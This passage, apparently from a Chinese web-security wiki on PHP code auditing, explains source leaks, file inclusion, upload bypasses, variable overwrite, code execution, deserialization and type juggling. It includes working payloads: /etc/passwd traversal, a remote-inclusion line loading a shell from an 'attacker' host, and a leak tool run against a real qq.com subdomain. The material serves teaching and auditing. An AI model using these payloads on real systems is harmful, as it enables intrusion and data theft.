.DS_Store \u6587\u4ef6\uff0c\u5305\u542b\u6587\u4ef6\u540d\u7b49\u4fe1\u606f\u3002 \u5229\u7528\u5de5\u5177 ds\uff3fstore\uff3fexp python ds_store_exp.py http://hd.zj.qq.com/themes/galaxyw/.DS_Store hd.zj.qq.com/ \u2514\u2500\u2500 themes \u2514\u2500\u2500 galaxyw \u251c\u2500\u2500 app \u2502 \u2514\u2500\u2500 css \u2502 \u2514\u2500\u2500 style.min.css \u251c\u2500\u2500 cityData.min.js \u251c\u2500\u2500 images \u2502 \u2514\u2500\u2500 img \u2502 \u251c\u2500\u2500 bg-hd.png \u2502 \u251c\u2500\u2500 bg-item-activity.png \u2502 \u251c\u2500\u2500 bg-masker-pop.png \u2502 \u251c\u2500\u2500 btn-bm.png \u2502 \u251c\u2500\u2500 btn-login-qq.png \u2502 \u251c\u2500\u2500 btn-login-wx.png \u2502 \u251c\u2500\u2500 ico-add-pic.png \u2502 \u251c\u2500\u2500 ico-address.png \u2502 \u251c\u2500\u2500 ico-bm.png \u2502 \u251c\u2500\u2500 ico-duration-time.png \u2502 \u251c\u2500\u2500 ico-pop-close.png \u2502 \u251c\u2500\u2500 ico-right-top-delete.png \u2502 \u251c\u2500\u2500 page-login-hd.png \u2502 \u251c\u2500\u2500 pic-masker.png \u2502 \u2514\u2500\u2500 ticket-selected.png \u2514\u2500\u2500 member \u251c\u2500\u2500 assets \u2502 \u251c\u2500\u2500 css \u2502 \u2502 \u251c\u2500\u2500 ace-reset.css \u2502 \u2502 \u2514\u2500\u2500 antd.css \u2502 \u2514\u2500\u2500 lib \u2502 \u251c\u2500\u2500 cityData.min.js \u2502 \u2514\u2500\u2500 ueditor \u2502 \u251c\u2500\u2500 index.html \u2502 \u251c\u2500\u2500 lang \u2502 \u2502 \u2514\u2500\u2500 zh-cn \u2502 \u2502 \u251c\u2500\u2500 images \u2502 \u2502 \u2502 \u251c\u2500\u2500 copy.png \u2502 \u2502 \u2502 \u251c\u2500\u2500 localimage.png \u2502 \u2502 \u2502 \u251c\u2500\u2500 music.png \u2502 \u2502 \u2502 \u2514\u2500\u2500 upload.png \u2502 \u2502 \u2514\u2500\u2500 zh-cn.js \u2502 \u251c\u2500\u2500 php \u2502 \u2502 \u251c\u2500\u2500 action_crawler.php \u2502 \u2502 \u251c\u2500\u2500 action_list.php \u2502 \u2502 \u251c\u2500\u2500 action_upload.php \u2502 \u2502 \u251c\u2500\u2500 config.json \u2502 \u2502 \u251c\u2500\u2500 controller.php \u2502 \u2502 \u2514\u2500\u2500 Uploader.class.php \u2502 \u251c\u2500\u2500 ueditor.all.js \u2502 \u251c\u2500\u2500 ueditor.all.min.js \u2502 \u251c\u2500\u2500 ueditor.config.js \u2502 \u251c\u2500\u2500 ueditor.parse.js \u2502 \u2514\u2500\u2500 ueditor.parse.min.js \u2514\u2500\u2500 static \u251c\u2500\u2500 css \u2502 \u2514\u2500\u2500 page.css \u251c\u2500\u2500 img \u2502 \u251c\u2500\u2500 bg-table-title.png \u2502 \u251c\u2500\u2500 bg-tab-say.png \u2502 \u251c\u2500\u2500 ico-black-disabled.png \u2502 \u251c\u2500\u2500 ico-black-enabled.png \u2502 \u251c\u2500\u2500 ico-coorption-person.png \u2502 \u251c\u2500\u2500 ico-miss-person.png \u2502 \u251c\u2500\u2500 ico-mr-person.png \u2502 \u251c\u2500\u2500 ico-white-disabled.png \u2502 \u2514\u2500\u2500 ico-white-enabled.png \u2514\u2500\u2500 scripts \u251c\u2500\u2500 js \u2514\u2500\u2500 lib \u2514\u2500\u2500 jquery.min.js 21 directories, 48 files \u7f51\u7ad9\u5907\u4efd\u6587\u4ef6 \u00b6 \u7ba1\u7406\u5458\u5907\u4efd\u7f51\u7ad9\u6587\u4ef6\u540e\u9519\u8bef\u5730\u5c06\u5907\u4efd\u653e\u5728 Web \u76ee\u5f55\u4e0b\u3002 \u5e38\u89c1\u7684\u540e\u7f00\u540d\uff1a .rar .zip .7z .tar .tar.gz .bak .txt SVN \u6cc4\u9732 \u00b6 \u654f\u611f\u6587\u4ef6\uff1a /.svn /.svn/wc.db /.svn/entries dvcs-ripper perl rip-svn.pl -v -u http://www.example.com/.svn/ Seay - SVN WEB-INF / web.xml \u6cc4\u9732 \u00b6 WEB-INF \u662f Java Web \u5e94\u7528\u7684\u5b89\u5168\u76ee\u5f55\uff0cweb.xml \u4e2d\u6709\u6587\u4ef6\u7684\u6620\u5c04\u5173\u7cfb\u3002 WEB-INF \u4e3b\u8981\u5305\u542b\u4e00\u4e0b\u6587\u4ef6\u6216\u76ee\u5f55\uff1a /WEB-INF/web.xml \uff1aWeb \u5e94\u7528\u7a0b\u5e8f\u914d\u7f6e\u6587\u4ef6\uff0c\u63cf\u8ff0\u4e86 servlet \u548c\u5176\u4ed6\u7684\u5e94\u7528\u7ec4\u4ef6\u914d\u7f6e\u53ca\u547d\u540d\u89c4\u5219\u3002 /WEB-INF/classes/ \uff1a\u542b\u4e86\u7ad9\u70b9\u6240\u6709\u7528\u7684 class \u6587\u4ef6\uff0c\u5305\u62ec servlet class \u548c\u975e servlet class\uff0c\u4ed6\u4eec\u4e0d\u80fd\u5305\u542b\u5728\u3002jar \u6587\u4ef6\u4e2d\u3002 /WEB-INF/lib/ \uff1a\u5b58\u653e web \u5e94\u7528\u9700\u8981\u7684\u5404\u79cd JAR \u6587\u4ef6\uff0c\u653e\u7f6e\u4ec5\u5728\u8fd9\u4e2a\u5e94\u7528\u4e2d\u8981\u6c42\u4f7f\u7528\u7684 jar \u6587\u4ef6\uff0c\u5982\u6570\u636e\u5e93\u9a71\u52a8 jar \u6587\u4ef6\u3002 /WEB-INF/src/ \uff1a\u6e90\u7801\u76ee\u5f55\uff0c\u6309\u7167\u5305\u540d\u7ed3\u6784\u653e\u7f6e\u5404\u4e2a java \u6587\u4ef6\u3002 /WEB-INF/database.properties \uff1a\u6570\u636e\u5e93\u914d\u7f6e\u6587\u4ef6\u3002 \u901a\u8fc7\u627e\u5230 web.xml \u6587\u4ef6\uff0c\u63a8\u65ad class \u6587\u4ef6\u7684\u8def\u5f84\uff0c\u6700\u540e\u76f4\u63a5 class \u6587\u4ef6\uff0c\u5728\u901a\u8fc7\u53cd\u7f16\u8bd1 class \u6587\u4ef6\uff0c\u5f97\u5230\u7f51\u7ad9\u6e90\u7801\u3002 \u4e00\u822c\u60c5\u51b5\uff0cjsp \u5f15\u64ce\u9ed8\u8ba4\u90fd\u662f\u7981\u6b62\u8bbf\u95ee WEB-INF \u76ee\u5f55\u7684\uff0cNginx \u914d\u5408 Tomcat \u505a\u5747\u8861\u8d1f\u8f7d\u6216\u96c6\u7fa4\u7b49\u60c5\u51b5\u65f6\uff0c\u95ee\u9898\u539f\u56e0\u5176\u5b9e\u5f88\u7b80\u5355\uff0cNginx \u4e0d\u4f1a\u53bb\u8003\u8651\u914d\u7f6e\u5176\u4ed6\u7c7b\u578b\u5f15\u64ce\uff08Nginx \u4e0d\u662f jsp \u5f15\u64ce\uff09\u5bfc\u81f4\u7684\u5b89\u5168\u95ee\u9898\u800c\u5f15\u5165\u5230\u81ea\u8eab\u7684\u5b89\u5168\u89c4\u8303\u4e2d\u6765\uff08\u8fd9\u6837\u8026\u5408\u6027\u592a\u9ad8\u4e86\uff09\uff0c\u4fee\u6539 Nginx \u914d\u7f6e\u6587\u4ef6\u7981\u6b62\u8bbf\u95ee WEB-INF \u76ee\u5f55\u5c31\u597d\u4e86\uff1a location ~ ^/WEB-INF/* { deny all ; } # \u6216\u8005return 404; \u6216\u8005\u5176\u4ed6\uff01 CVS \u6cc4\u9732 \u00b6 http://url/CVS/Root \u8fd4\u56de\u6839\u4fe1\u606f http://url/CVS/Entries \u8fd4\u56de\u6240\u6709\u6587\u4ef6\u7684\u7ed3\u6784 \u53d6\u56de\u6e90\u7801 bk clone http://url/name dir","title":"PHP \u4ee3\u7801\u5ba1\u8ba1"},{"location":"web/php/#_1","text":"\u5e38\u89c1\u7684\u5bfc\u81f4\u6587\u4ef6\u5305\u542b\u7684\u51fd\u6570\u6709\uff1a PHP\uff1a include() \uff0c include_once() \uff0c require() \uff0c require_once() \uff0c fopen() \uff0c readfile() \u7b49 JSP Servlet\uff1a ava.io.File() \uff0c java.io.FileReader() \u7b49 ASP\uff1a includefile \uff0c includevirtual \u7b49 \u5f53 PHP \u5305\u542b\u4e00\u4e2a\u6587\u4ef6\u65f6\uff0c\u4f1a\u5c06\u8be5\u6587\u4ef6\u5f53\u505a PHP \u4ee3\u7801\u6267\u884c\uff0c\u800c\u4e0d\u4f1a\u5728\u610f\u6587\u4ef6\u65f6\u4ec0\u4e48\u7c7b\u578b\u3002","title":"\u6587\u4ef6\u5305\u542b"},{"location":"web/php/#_2","text":"\u672c\u5730\u6587\u4ef6\u5305\u542b\uff0cLocal File Inclusion\uff0cLFI\u3002 <?php $file = $_GET [ 'file' ]; if ( file_exists ( '/home/wwwrun/' . $file . '.php' )) { include '/home/wwwrun/' . $file . '.php' ; } ?> \u4e0a\u8ff0\u4ee3\u7801\u5b58\u5728\u672c\u5730\u6587\u4ef6\u5305\u542b\uff0c\u53ef\u7528 %00 \u622a\u65ad\u7684\u65b9\u5f0f\u8bfb\u53d6 /etc/passwd \u6587\u4ef6\u5185\u5bb9\u3002 %00 \u622a\u65ad ?file=../../../../../../../../../etc/passwd%00 \u9700\u8981 magic_quotes_gpc=off \uff0cPHP \u5c0f\u4e8e 5.3.4 \u6709\u6548\u3002 \u8def\u5f84\u957f\u5ea6\u622a\u65ad ?file=../../../../../../../../../etc/passwd/././././././.[\u2026]/./././././. Linux \u9700\u8981\u6587\u4ef6\u540d\u957f\u4e8e 4096\uff0cWindows \u9700\u8981\u957f\u4e8e 256\u3002 \u70b9\u53f7\u622a\u65ad ?file=../../../../../../../../../boot.ini/\u2026\u2026\u2026[\u2026]\u2026\u2026\u2026\u2026 \u53ea\u9002\u7528 Windows\uff0c\u70b9\u53f7\u9700\u8981\u957f\u4e8e 256\u3002","title":"\u672c\u5730\u6587\u4ef6\u5305\u542b"},{"location":"web/php/#_3","text":"\u8fdc\u7a0b\u6587\u4ef6\u5305\u542b\uff0cRemote File Inclusion\uff0cRFI\u3002 <?php if ( $route == \"share\" ) { require_once $basePath . \"/action/m_share.php\" ; } elseif ( $route == \"sharelink\" ) { require_once $basePath . \"/action/m_sharelink.php\" ; } \u6784\u9020\u53d8\u91cf basePath \u7684\u503c\u3002 /?basePath=http://attacker/phpshell.txt? \u6700\u7ec8\u7684\u4ee3\u7801\u6267\u884c\u4e86 require_once \"http://attacker/phpshell.txt?/action/m_share.php\"; \u95ee\u53f7\u540e\u7684\u90e8\u5206\u88ab\u89e3\u91ca\u4e3a URL \u7684 querystring\uff0c\u8fd9\u4e5f\u662f\u4e00\u79cd\u300c\u622a\u65ad\u300d\u3002 \u666e\u901a\u8fdc\u7a0b\u6587\u4ef6\u5305\u542b ?file=[http|https|ftp]://example.com/shell.txt \u9700\u8981 allow_url_fopen=On \u5e76\u4e14 allow_url_include=On \u3002 \u5229\u7528 PHP \u6d41 input ?file=php://input \u9700\u8981 allow_url_include=On \u3002 \u5229\u7528 PHP \u6d41 filter ?file=php://filter/convert.base64-encode/resource=index.php \u9700\u8981 allow_url_include=On \u3002 \u5229\u7528 data URIs ?file=data://text/plain;base64,SSBsb3ZlIFBIUAo= \u9700\u8981 allow_url_include=On \u3002 \u5229\u7528 XSS \u6267\u884c ?file=http://127.0.0.1/path/xss.php?xss=phpcode \u9700\u8981 allow_url_fopen=On \uff0c allow_url_include=On \u5e76\u4e14\u9632\u706b\u5899\u6216\u8005\u767d\u540d\u5355\u4e0d\u5141\u8bb8\u8bbf\u95ee\u5916\u7f51\u65f6\uff0c\u5148\u5728\u540c\u7ad9\u70b9\u627e\u4e00\u4e2a XSS \u6f0f\u6d1e\uff0c\u5305\u542b\u8fd9\u4e2a\u9875\u9762\uff0c\u5c31\u53ef\u4ee5\u6ce8\u5165\u6076\u610f\u4ee3\u7801\u4e86\u3002","title":"\u8fdc\u7a0b\u6587\u4ef6\u5305\u542b"},{"location":"web/php/#_4","text":"\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u662f\u6307\u7528\u6237\u4e0a\u4f20\u4e86\u4e00\u4e2a\u53ef\u6267\u884c\u811a\u672c\u6587\u4ef6\uff0c\u5e76\u901a\u8fc7\u6b64\u6587\u4ef6\u83b7\u5f97\u4e86\u6267\u884c\u670d\u5668\u7aef\u547d\u4ee4\u7684\u80fd\u529b\u3002\u5728\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u4e00\u822c\u662f\u6307\u4e0a\u4f20 WEB \u811a\u672c\u80fd\u591f\u88ab\u670d\u52a1\u5668\u89e3\u6790\u7684\u95ee\u9898\uff0c\u4e5f\u5c31\u662f\u6240\u8c13\u7684 webshell \u95ee\u9898\u3002\u5b8c\u6210\u8fd9\u4e00\u653b\u51fb\u9700\u8981\u8fd9\u6837\u51e0\u4e2a\u6761\u4ef6\uff0c\u4e00\u662f\u4e0a\u4f20\u7684\u6587\u4ef6\u80fd\u591f\u8fd9 WEB \u5bb9\u5668\u6267\u884c\uff0c\u5176\u6b21\u7528\u6237\u80fd\u4ece WEB \u4e0a\u8bbf\u95ee\u8fd9\u4e2a\u6587\u4ef6\uff0c\u6700\u540e\uff0c\u5982\u679c\u4e0a\u4f20\u7684\u6587\u4ef6\u88ab\u5b89\u5168\u68c0\u67e5\u3001\u683c\u5f0f\u5316\u3001\u56fe\u7247\u538b\u7f29\u7b49\u529f\u80fd\u6539\u53d8\u4e86\u5185\u5bb9\uff0c\u5219\u53ef\u80fd\u5bfc\u81f4\u653b\u51fb\u5931\u8d25\u3002","title":"\u6587\u4ef6\u4e0a\u4f20"},{"location":"web/php/#_5","text":"\u524d\u7aef\u68c0\u67e5\u6269\u5c55\u540d \u6293\u5305\u7ed5\u8fc7\u5373\u53ef\u3002 Content-Type \u68c0\u6d4b\u6587\u4ef6\u7c7b\u578b \u6293\u5305\u4fee\u6539 Content-Type \u7c7b\u578b\uff0c\u4f7f\u5176\u7b26\u5408\u767d\u540d\u5355\u89c4\u5219\u3002 \u670d\u52a1\u7aef\u6dfb\u52a0\u540e\u7f00 \u5c1d\u8bd5 %00 \u622a\u65ad\u3002 \u670d\u52a1\u7aef\u6269\u5c55\u540d\u68c0\u6d4b \u5229\u7528\u89e3\u6790\u6f0f\u6d1e\u3002 Apache \u89e3\u6790 phpshell.php.rar.rar.rar.rar \u56e0\u4e3a Apache \u4e0d\u8ba4\u8bc6 .rar \u8fd9\u4e2a\u6587\u4ef6\u7c7b\u578b\uff0c\u6240\u4ee5\u4f1a\u4e00\u76f4\u904d\u5386\u540e\u7f00\u5230 .php \uff0c\u7136\u540e\u8ba4\u4e3a\u8fd9\u662f\u4e00\u4e2a PHP \u6587\u4ef6\u3002 IIS \u89e3\u6790 IIS 6 \u4e0b\u5f53\u6587\u4ef6\u540d\u4e3a abc.asp;xx.jpg \u65f6\uff0c\u4f1a\u5c06\u5176\u89e3\u6790\u4e3a abc.asp \u3002 PHP CGI \u8def\u5f84\u89e3\u6790 \u5f53\u8bbf\u95ee http://www.a.com/path/test.jpg/notexist.php \u65f6\uff0c\u4f1a\u5c06 test.jpg \u5f53\u505a PHP \u89e3\u6790\uff0c notexist.php \u662f\u4e0d\u5b58\u5728\u7684\u6587\u4ef6\u3002\u6b64\u65f6 Nginx \u7684\u914d\u7f6e\u5982\u4e0b location ~ \\.php$ { root html ; fastcgi_pass 127.0.0.1 : 9000 ; fastcgi_index index.php ; fastcgi_param SCRIPT_FILENAME /scripts $fastcgi_script_name ; include fastcgi_param ; } \u5176\u4ed6\u65b9\u5f0f \u540e\u7f00\u5927\u5c0f\u5199\u3001\u53cc\u5199\u3001\u7279\u6b8a\u540e\u7f00\u5982 php5 \u7b49\uff0c\u4fee\u6539\u5305\u5185\u5bb9\u7684\u5927\u5c0f\u5199\u8fc7 WAF \u7b49\u3002","title":"\u7ed5\u8fc7\u4e0a\u4f20\u68c0\u67e5"},{"location":"web/php/#_6","text":"","title":"\u53d8\u91cf\u8986\u76d6"},{"location":"web/php/#_7","text":"\u53d8\u91cf\u5982\u679c\u672a\u88ab\u521d\u59cb\u5316\uff0c\u4e14\u80fd\u591f\u7528\u6237\u6240\u63a7\u5236\uff0c\u90a3\u4e48\u5f88\u53ef\u80fd\u4f1a\u5bfc\u81f4\u5b89\u5168\u95ee\u9898\u3002 register_globals = ON \u793a\u4f8b <?php echo \"Register_globals: \" . ( int ) ini_get ( \"register_globals\" ) . \"<br/>\" ; if ( $auth ) { echo \"private!\" ; } ?> \u5f53 register_globals=ON \u65f6\uff0c\u63d0\u4ea4 test.php?auth=1 \uff0c auth \u53d8\u91cf\u5c06\u81ea\u52a8\u5f97\u5230\u8d4b\u503c\u3002","title":"\u5168\u5c40\u53d8\u91cf\u8986\u76d6"},{"location":"web/php/#extract","text":"extract() \u51fd\u6570\u80fd\u591f\u5c06\u53d8\u91cf\u4ece\u6570\u7ec4\u5bfc\u5165\u5230\u5f53\u524d\u7684\u7b26\u53f7\u8868\uff0c\u5176\u5b9a\u4e49\u4e3a int extract ( array $var_array [, int $extract_type [, string $prefix ]] ) \u5176\u4e2d\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u6307\u5b9a\u51fd\u6570\u5c06\u53d8\u91cf\u5bfc\u5165\u7b26\u53f7\u8868\u65f6\u7684\u884c\u4e3a\uff0c\u6700\u5e38\u89c1\u7684\u4e24\u4e2a\u503c\u662f EXTR_OVERWRITE \u548c EXTR_SKIP \u3002 \u5f53\u503c\u4e3a EXTR_OVERWRITE \u65f6\uff0c\u5728\u5c06\u53d8\u91cf\u5bfc\u5165\u7b26\u53f7\u8868\u7684\u8fc7\u7a0b\u4e2d\uff0c\u5982\u679c\u53d8\u91cf\u540d\u53d1\u751f\u51b2\u7a81\uff0c\u5219\u8986\u76d6\u6240\u6709\u53d8\u91cf\uff1b\u503c\u4e3a EXTR_SKIP \u5219\u8868\u793a\u8df3\u8fc7\u4e0d\u8986\u76d6\u3002\u82e5\u7b2c\u4e8c\u4e2a\u53c2\u6570\u672a\u6307\u5b9a\uff0c\u5219\u5728\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u4f7f\u7528 EXTR_OVERWRITE \u3002 <?php $auth = \"0\" ; extract ( $_GET ); if ( $auth == 1 ) { echo \"private!\" ; } else { echo \"public!\" ; } ?> \u5f53 extract() \u51fd\u6570\u4ece\u7528\u6237\u53ef\u4ee5\u63a7\u5236\u7684\u6570\u7ec4\u4e2d\u5bfc\u51fa\u53d8\u91cf\u65f6\uff0c\u53ef\u80fd\u53d1\u751f\u53d8\u91cf\u8986\u76d6\u3002","title":"extract() \u53d8\u91cf\u8986\u76d6"},{"location":"web/php/#import_request_variables","text":"bool import_request_variables (string $types [, string $prefix]) import_request_variables \u5c06 GET\u3001POST\u3001Cookies \u4e2d\u7684\u53d8\u91cf\u5bfc\u5165\u5230\u5168\u5c40\uff0c\u4f7f\u7528\u8fd9\u4e2a\u51fd\u6570\u53ea\u7528\u7b80\u5355\u5730\u6307\u5b9a\u7c7b\u578b\u5373\u53ef\u3002 <?php $auth = \"0\" ; import_request_variables ( \"G\" ); if ( $auth == 1 ) { echo \"private!\" ; } else { echo \"public!\" ; } ?> import_request_variables(\"G\") \u6307\u5b9a\u5bfc\u5165 GET \u8bf7\u6c42\u4e2d\u7684\u53d8\u91cf\uff0c\u63d0\u4ea4 test.php?auth=1 \u51fa\u73b0\u53d8\u91cf\u8986\u76d6\u3002","title":"import_request_variables \u53d8\u91cf\u8986\u76d6"},{"location":"web/php/#parse_str","text":"void parse_str ( string $str [, array &$arr ]) parse_str() \u51fd\u6570\u901a\u5e38\u7528\u4e8e\u89e3\u6790 URL \u4e2d\u7684 querystring\uff0c\u4f46\u662f\u5f53\u53c2\u6570\u503c\u53ef\u4ee5\u88ab\u7528\u6237\u63a7\u5236\u65f6\uff0c\u5f88\u53ef\u80fd\u5bfc\u81f4\u53d8\u91cf\u8986\u76d6\u3002 // var.php?var=new \u53d8\u91cf\u8986\u76d6 $var = \"init\"; parse_str($_SERVER[\"QUERY_STRING\"]); print $var; \u4e0e parse_str() \u7c7b\u4f3c\u7684\u51fd\u6570\u8fd8\u6709 mb_parse_str() \u3002","title":"parse_str() \u53d8\u91cf\u8986\u76d6"},{"location":"web/php/#_8","text":"","title":"\u547d\u4ee4\u6267\u884c"},{"location":"web/php/#_9","text":"PHP \u4e2d\u6709\u4e0d\u5c11\u53ef\u4ee5\u76f4\u63a5\u6267\u884c\u4ee3\u7801\u7684\u51fd\u6570\u3002 eval(); assert(); system(); exec(); shell_exec(); passthru(); escapeshellcmd(); pcntl_exec(); ......","title":"\u76f4\u63a5\u6267\u884c\u4ee3\u7801"},{"location":"web/php/#preg_replace","text":"preg_replace() \u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u5982\u679c\u5b58\u5728 /e \u6a21\u5f0f\u4fee\u9970\u7b26\uff0c\u5219\u5141\u8bb8\u4ee3\u7801\u6267\u884c\u3002 <?php $var = \"<tag>phpinfo()</tag>\" ; preg_replace ( \"/<tag>(.*?)<\\/tag>/e\" , \"addslashes( \\\\ 1)\" , $var ); ?> \u5982\u679c\u6ca1\u6709 /e \u4fee\u9970\u7b26\uff0c\u53ef\u4ee5\u5c1d\u8bd5 %00 \u622a\u65ad\u3002","title":"preg_replace() \u4ee3\u7801\u6267\u884c"},{"location":"web/php/#_10","text":"\u7528\u6237\u81ea\u5b9a\u4e49\u7684\u51fd\u6570\u53ef\u4ee5\u5bfc\u81f4\u4ee3\u7801\u6267\u884c\u3002 <?php $dyn_func = $_GET [ \"dyn_func\" ]; $argument = $_GET [ \"argument\" ]; $dyn_func ( $argument ); ?>","title":"\u52a8\u6001\u51fd\u6570\u6267\u884c"},{"location":"web/php/#_11","text":"<?php echo `ls -al` ; ?>","title":"\u53cd\u5f15\u53f7\u547d\u4ee4\u6267\u884c"},{"location":"web/php/#curly-syntax","text":"PHP \u7684 Curly Syntax \u4e5f\u80fd\u5bfc\u81f4\u4ee3\u7801\u6267\u884c\uff0c\u5b83\u5c06\u6267\u884c\u82b1\u62ec\u53f7\u95f4\u7684\u4ee3\u7801\uff0c\u5e76\u5c06\u7ed3\u679c\u66ff\u6362\u56de\u53bb\u3002 <?php $var = \"aaabbbccc ${ `ls` } \" ; ?> <?php $foobar = \"phpinfo\" ; $ { \"foobar\" }(); ?>","title":"Curly Syntax"},{"location":"web/php/#_12","text":"\u5f88\u591a\u51fd\u6570\u90fd\u53ef\u4ee5\u6267\u884c\u56de\u8c03\u51fd\u6570\uff0c\u5f53\u56de\u8c03\u51fd\u6570\u7528\u6237\u53ef\u63a7\u65f6\uff0c\u5c06\u5bfc\u81f4\u4ee3\u7801\u6267\u884c\u3002 <?php $evil_callback = $_GET [ \"callback\" ]; $some_array = array ( 0 , 1 , 2 , 3 ); $new_array = array_map ( $evil_callback , $some_array ); ?> \u653b\u51fb payload http://www.a.com/index.php?callback=phpinfo","title":"\u56de\u8c03\u51fd\u6570"},{"location":"web/php/#_13","text":"\u5982\u679c unserialize() \u5728\u6267\u884c\u65f6\u5b9a\u4e49\u4e86 __destruct() \u6216 __wakeup() \u51fd\u6570\uff0c\u5219\u6709\u53ef\u80fd\u5bfc\u81f4\u4ee3\u7801\u6267\u884c\u3002 <?php class Example { var $var = \"\" ; function __destruct () { eval ( $this -> $var ); } } unserialize ( $_GET [ \"saved_code\" ]); ?> \u653b\u51fb payload http://www.a.com/index.php?saved_code=O:7:\"Example\":1:{s:3:\"var\";s:10:\"phpinfo();\";}","title":"\u53cd\u5e8f\u5217\u5316"},{"location":"web/php/#php","text":"","title":"PHP \u7279\u6027"},{"location":"web/php/#_14","text":"<?php $var = 1 ; $var = array (); $var = \"string\" ; ?> php \u4e0d\u4f1a\u4e25\u683c\u68c0\u9a8c\u4f20\u5165\u7684\u53d8\u91cf\u7c7b\u578b\uff0c\u4e5f\u53ef\u4ee5\u5c06\u53d8\u91cf\u81ea\u7531\u7684\u8f6c\u6362\u7c7b\u578b\u3002 \u6bd4\u5982\u5728 $a == $b \u7684\u6bd4\u8f83\u4e2d $a = null; $b = false; //\u4e3a\u771f $a = ''; $b = 0; //\u540c\u6837\u4e3a\u771f \u7136\u800c\uff0cPHP \u5185\u6838\u7684\u5f00\u53d1\u8005\u539f\u672c\u662f\u60f3\u8ba9\u7a0b\u5e8f\u5458\u501f\u7531\u8fd9\u79cd\u4e0d\u9700\u8981\u58f0\u660e\u7684\u4f53\u7cfb\uff0c\u66f4\u52a0\u9ad8\u6548\u7684\u5f00\u53d1\uff0c\u6240\u4ee5\u5728\u51e0\u4e4e\u6240\u6709\u5185\u7f6e\u51fd\u6570\u4ee5\u53ca\u57fa\u672c\u7ed3\u6784\u4e2d\u4f7f\u7528\u4e86\u5f88\u591a\u677e\u6563\u7684\u6bd4\u8f83\u548c\u8f6c\u6362\uff0c\u9632\u6b62\u7a0b\u5e8f\u4e2d\u7684\u53d8\u91cf\u56e0\u4e3a\u7a0b\u5e8f\u5458\u7684\u4e0d\u89c4\u8303\u800c\u9891\u7e41\u7684\u62a5\u9519\uff0c\u7136\u800c\u8fd9\u5374\u5e26\u6765\u4e86\u5b89\u5168\u95ee\u9898\u3002 0=='0' //true 0 == 'abcdefg' //true 0 === 'abcdefg' //false 1 == '1abcdef' //true","title":"\u6570\u7ec4"},{"location":"web/php/#hash","text":"\"0e132456789\"==\"0e7124511451155\" //true \"0e123456abc\"==\"0e1dddada\" //false \"0e1abc\"==\"0\" //true \u5728\u8fdb\u884c\u6bd4\u8f83\u8fd0\u7b97\u65f6\uff0c\u5982\u679c\u9047\u5230\u4e86 0e\\d+ \u8fd9\u79cd\u5b57\u7b26\u4e32\uff0c\u5c31\u4f1a\u5c06\u8fd9\u79cd\u5b57\u7b26\u4e32\u89e3\u6790\u4e3a\u79d1\u5b66\u8ba1\u6570\u6cd5\u3002\u6240\u4ee5\u4e0a\u9762\u4f8b\u5b50\u4e2d 2 \u4e2a\u6570\u7684\u503c\u90fd\u662f 0 \u56e0\u800c\u5c31\u76f8\u7b49\u4e86\u3002\u5982\u679c\u4e0d\u6ee1\u8db3 0e\\d+ \u8fd9\u79cd\u6a21\u5f0f\u5c31\u4e0d\u4f1a\u76f8\u7b49\u3002","title":"\u9b54\u6cd5 Hash"},{"location":"web/php/#_15","text":"\"0x1e240\"==\"123456\" //true \"0x1e240\"==123456 //true \"0x1e240\"==\"1e240\" //false \u5f53\u5176\u4e2d\u7684\u4e00\u4e2a\u5b57\u7b26\u4e32\u662f 0x \u5f00\u5934\u7684\u65f6\u5019\uff0cPHP \u4f1a\u5c06\u6b64\u5b57\u7b26\u4e32\u89e3\u6790\u6210\u4e3a\u5341\u8fdb\u5236\u7136\u540e\u518d\u8fdb\u884c\u6bd4\u8f83\uff0c 0x1240 \u89e3\u6790\u6210\u4e3a\u5341\u8fdb\u5236\u5c31\u662f 123456\uff0c\u6240\u4ee5\u4e0e int \u7c7b\u578b\u548c string \u7c7b\u578b\u7684 123456 \u6bd4\u8f83\u90fd\u662f\u76f8\u7b49\u3002","title":"\u5341\u516d\u8fdb\u5236\u8f6c\u6362"},{"location":"web/php/#_16","text":"\u5e38\u89c1\u7684\u8f6c\u6362\u4e3b\u8981\u5c31\u662f int \u8f6c\u6362\u4e3a string \uff0c string \u8f6c\u6362\u4e3a int \u3002 int \u8f6c string $var = 5; \u65b9\u5f0f1\uff1a$item = (string)$var; \u65b9\u5f0f2\uff1a$item = strval($var); string \u8f6c int \uff1a intval() \u51fd\u6570\u3002 \u5bf9\u4e8e\u8fd9\u4e2a\u51fd\u6570\uff0c\u53ef\u4ee5\u5148\u770b 2 \u4e2a\u4f8b\u5b50\u3002 var_dump(intval('2')) //2 var_dump(intval('3abcd')) //3 var_dump(intval('abcd')) //0 \u8bf4\u660e intval() \u8f6c\u6362\u7684\u65f6\u5019\uff0c\u4f1a\u5c06\u4ece\u5b57\u7b26\u4e32\u7684\u5f00\u59cb\u8fdb\u884c\u8f6c\u6362\u77e5\u9053\u9047\u5230\u4e00\u4e2a\u975e\u6570\u5b57\u7684\u5b57\u7b26\u3002\u5373\u4f7f\u51fa\u73b0\u65e0\u6cd5\u8f6c\u6362\u7684\u5b57\u7b26\u4e32\uff0c intval() \u4e0d\u4f1a\u62a5\u9519\u800c\u662f\u8fd4\u56de 0\u3002 \u540c\u65f6\uff0c\u7a0b\u5e8f\u5458\u5728\u7f16\u7a0b\u7684\u65f6\u5019\u4e5f\u4e0d\u5e94\u8be5\u4f7f\u7528\u5982\u4e0b\u7684\u8fd9\u6bb5\u4ee3\u7801\uff1a if(intval($a)>1000) { mysql_query(\"select * from news where id=\".$a) } \u8fd9\u4e2a\u65f6\u5019 $a \u7684\u503c\u6709\u53ef\u80fd\u662f 1002 union 